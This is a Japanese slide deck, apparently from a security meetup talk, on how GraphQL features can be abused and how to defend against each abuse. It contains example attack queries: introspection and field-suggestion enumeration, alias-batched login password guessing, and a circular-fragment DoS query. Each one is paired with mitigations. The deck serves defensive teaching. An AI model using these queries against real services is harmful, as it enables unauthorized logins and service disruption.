---
title: 攻撃者の視点から見たGraphQLのセキュリティ
author: kuzushiki
where: 'Security․Tokyo #2'
layout: cover
hideInToc: true
fonts:
  sans: BIZ UDPGothic,Robot
  serif: BIZ UDPGothic,Robot Slab
  mono: BIZ UDPGothic,Fira Code
highlighter: shiki
lineNumbers: true
theme: academic
coverDate: ''
themeConfig:
  paginationX: r
  paginationY: t
css: unocss

githubPages:
  ogp: true
---

# {{ $slidev.configs.title }}

## {{ $slidev.configs.author }}

<!--
時間かつかつなので、
タイトルは読み上げない

それでは発表を始めます程度で
-->

---
hideInToc: true
---

# 自己紹介

<br>

<div class="grid grid-cols-[70%_30%] gap-4">
<div>

### {{ $slidev.configs.author }}

- とあるセキュリティベンダの診断員 (4年目)

- Webアプリの脆弱性診断、たまにペネトレ
  
- 最近バグバウンティにハマる
  
- 情報処理安全確保支援士 / OSCP / OSWE


</div><div>

<img src="/logo.png" width=200 />

</div></div>

<!--
自己紹介も短めに

kuzushikiです、診断やってます

くらいで
-->

---
layout: center
---

# GraphQLって？

---
layout: figure-side
figureCaption: >-
  https://engineering.mercari.com/blog/entry/20220303-concerns-with-using-graphql/
  より引用
figureUrl: /60b01ac1-fig1-1024x660.png
---

# GraphQLとは

<br>


- Facebookが開発した、APIのためのクエリ言語

- 開発者フレンドリー

  - 必要なデータだけを指定して取得可能

  - データの型を定義できる

<!--
GraphQLという名前が示すように、Graph理論のノードとエッジのような構造をとる

この例では Shopノードに関連するProductノードのリストを取得するという操作で、特定のショップで取り扱っている商品の情報を列挙することができる
-->

---

# GraphQLのやりとりをみてみよう

<br>

<div class="grid grid-cols-[50%_50%] gap-4">
<div>

GraphQLクエリ

```graphql
query {
  users(id: 1) {
    id
    username
  }
}
```

</div><div>

レスポンス

```json
{
  "data": {
    "users": [
      {
        "id": "1",
        "username": "admin"
      }
    ]
  }
}
```
  
</div></div>


---
layout: center
---

# GraphQLの機能とその悪用方法

<!--
GraphQL は開発者フレンドリーな機能が豊富

機能・悪用方法をセットで紹介
-->

---

# Introspection

<br>

- クライアントに**API がどのような操作を許可しているか**を伝える機能

- GraphQLクライアントでのドキュメント表示やフィールド名の自動補完に用いられる

<div class="grid grid-cols-[50%_50%] gap-4">
<div>

```graphql
query {
  __schema {
    types {
      fields {
        name
      }
    }
  }
}
```

</div><div>

```json
{
  "data": {
    "__schema": {
      "types": [
        {
          "fields": [
            {
              "name": "pastes"
            },
            {
              "name": "paste"
            },
            ...
```

</div></div>


---

# Introspectionを用いた情報収集

<br>

- 攻撃者にも**API がどのような操作を許可しているか**が伝わってしまう...

- 管理用の操作を実行される恐れ

```json
{
  "data": {
    "__schema": {
      "types": [
        {
          "fields": [
            ...
            {
              "name": "systemUpdate"
            },
            {
              "name": "systemDebug"
            },
            ...
```


---

# Introspectionを用いた情報収集の対策

<br>

- API の仕様を公開したくない場合は、Introspectionを無効にしておこう

- Introspectionが無効化できないサービスでは、"__schema"をWAFでブロックしよう

  - AWS AppSyncでの対策例:
  
    https://stackoverflow.com/questions/59503969/how-to-disable-introspection-queries-with-aws-appsync-graphql


---

# Alias

<br>

- 名前の衝突を避け、同じフィールド名を複数問い合わせられる機能

- Aliasなしだと以下のエラーとなる

  `Fields "users" conflict because they have differing arguments.`

<div class="grid grid-cols-[50%_50%] gap-4">
<div>

```graphql
query {
  user1: users(id: 1) {
    username
  }
  user2: users(id: 2) {
    username
  }
}
```

</div><div>

```json
{
  "data": {
    "user1": [
      {
        "username": "admin"
      }
    ],
    "user2": [
      {
        "username": "operator"
      }
    ...
```

<!--

aliasを使わないで実行するとエラーになる
```
"message": "Fields \"users\" conflict because they have differing arguments. Use different aliases on the fields to fetch both if this was intentional."
```

-->



</div></div>


---

# Aliasを用いた認証回避・DoS

<br>

攻撃者は1度のクエリで同一フィールドを複数要求可能に...

- 総当りやパスワードリスト攻撃による認証の突破

- 重いフィールドを何度も要求することによるDoS

<div class="grid grid-cols-[60%_40%] gap-4">
<div>

```graphql
query {
  admin: login(user: "admin", pass: "admin") {
    success
  }
  test: login(user: "admin", pass: "test") {
    success
  }
  ...
}
```

</div><div>

```json
{
  "data": {
    ...
    "truepassword": [
      {
        "success": true
      }
    ]
    ...
  }
}
```

</div></div>


---

# Aliasを用いた認証回避・DoSの対策

<br>

- 1度に使えるAlias数に制限を設ける

- コスト制限を設ける

  - クエリの複雑さをコストとして数値化し、しきい値を超えたらエラーを返す

  - コスト算出方法はライブラリによってまちまち 

<br>

※APIの回数制限では不十分なので注意!


---

# Fragment

<br>

クエリ内で繰り返し使用する部分を定義し、使い回せる機能

```graphql
query {
  user1: users(id: 1) {
    ...userInfo
  }
  user2: users(id: 2) {
    ...userInfo
  }
}

fragment userInfo on User {
  username
  email
}
```


---

# Fragmentを用いたDoS

<br>

- Fragmentの中でもFragmentが使えることがある!?

- 定義のしかたによっては無限ループに陥ることに... (Circular fragments)

```graphql
query {
  users(id: 1) {
    ...A
  }
}

fragment A on User {
  username
  ...B
}

fragment B on User {
  ...A
}
```


---

# Fragmentを用いたDoSの対策

<br>

すでにほとんどのGraphQLサーバでは対策済み

<br>

GraphQLの仕様で**fragmentはサイクルを形成してはいけない**と明記されており、仕様通りに実装できていれば問題ない

> The graph of fragment spreads must not form any cycles including spreading itself. Otherwise an operation could infinitely spread or infinitely execute on cycles in the underlying data.
<cite>https://spec.graphql.org/October2021/#sec-Fragment-spreads-must-not-form-cycles</cite>

<br>

RubyのHTTPサーバ[Agoo](https://github.com/ohler55/agoo)にこの問題が存在し、脆弱性として報告された (v2.14.3で修正済み)

https://nvd.nist.gov/vuln/detail/CVE-2022-30288


---

# Field Suggestion

<br>

フィールド名が間違っている場合に、正しいフィールド名を提案してくれる機能

```graphql
query {
  products(id: 1) {
    name
    price
  }
}
```

<br>

```
Cannot query field "products" on type "Query". Did you mean "product"?
```

<br>

非常に便利な機能だが...


---

# Field Suggestionを用いた情報収集

<br>

それっぽいフィールド名を大量に送り、有効なフィールド名を列挙 (Blind Introspection)

[clairvoyance](https://github.com/nikitastupin/clairvoyance) というツールを使うと、Introspection Queryの応答に近い情報が得られる

```graphql
query {
  articles
  documents
  posts
  ...
}
```

```json
{
  "errors": [
    ...
    {
      "message": "Cannot query field \"posts\" on type \"Query\". Did you mean \"pastes\" or \"paste\"?",
    ...
```

<!--
クレアヴォヤンス
-->

---

# Field Suggestionを用いた情報収集の対策

<br>

Introspectionを無効にする場合は、Field Suggestionも同様に無効化すべき

<br>

GraphQL開発者Lee Byron氏のコメント
> I would expect that a schema with introspection disabled would also disable didYouMean.  
I can’t think of a reason why you would want to disable introspection but enable didYouMean or vice versa.
<cite>https://github.com/graphql/graphql-js/issues/2247#issuecomment-815430294</cite>

<br>

> introspectionを無効にしたスキーマはdidYouMeanも無効になることを期待します。  
introspectionを無効にしてdidYouMeanを有効にしたい理由や、その逆は思いつかない。


---
layout: center
---

# たくさん悪用方法があって対策が大変...
# 良い方法ない？


---

# 究極の対策: Persisted Queries

<br>

<div class="grid grid-cols-[50%_50%] gap-4">
<div>

通常の方法
<img src="/1_WhBPlojnj9jocgetUbjwaQ.png" width=400 />

Persisted Queries
<img src="/1_eXAdxMmuzbmKb4bK2tO9xg.png" width=400 />

<div class="text-xs">
https://www.apollographql.com/blog/apollo-client/persisted-graphql-queries/ より引用
</div>

</div><div>

- GraphQLの柔軟性は失われるものの、攻撃者は自由にクエリを作れなくなる

  - 今までに紹介した攻撃はすべて防げる

<br>

- 本番環境で固定のクエリしか実行しないのであれば検討する余地あり

<br>
  
- 本来は帯域節約のために考えられた技術
  
</div></div>

<!--
通常、ユーザはクエリをGraphQLサーバに送信します

しかし、Persisted Queriesでは、ユーザはクエリに対応したIDを送り、ミドルウェアで対応したクエリを参照してサーバで実行します。

これにより、攻撃者は自由にクエリを作れなくなります
-->

---

# おわりに

<br>

- GraphQL特有の機能における悪用方法を紹介した

  - Introspectionを用いた情報収集

  - Aliasを用いた認証回避・DoS

  - Fragmentを用いたDoS

  - Field Suggestionを用いた情報収集

<br>

- GraphQLは開発者にとってフレンドリーだが、攻撃者にとってもフレンドリー

  - 不要な機能は無効化しておこう


---
layout: figure-side
figureCaption: 2023/4 発売。 約7000円とお高めだが買う価値アリ
figureUrl: /2023-07-26-21-10-57.png
---

# 参考文献

<br>

[**Black Hat GraphQL**](https://nostarch.com/black-hat-graphql) 

攻撃手法を体系的に学ぶことができる

<br>

学んだ結果↓

<Tweet id="1684040999339970560"/>

---

# その他の学習リソース

<br>

- https://github.com/flatt-security/mini-ctf

  - 2023/4,7 に開催されたFlatt Security主催のCTF
  
  - 出題環境が公開されており、Docker Composeでデプロイして解くことができる

<br>

- https://portswigger.net/web-security/graphql

  - あのBurpを作っているPortSwiggerのトレーニングコンテンツ
  
  - 2023/6に公開されたばかり
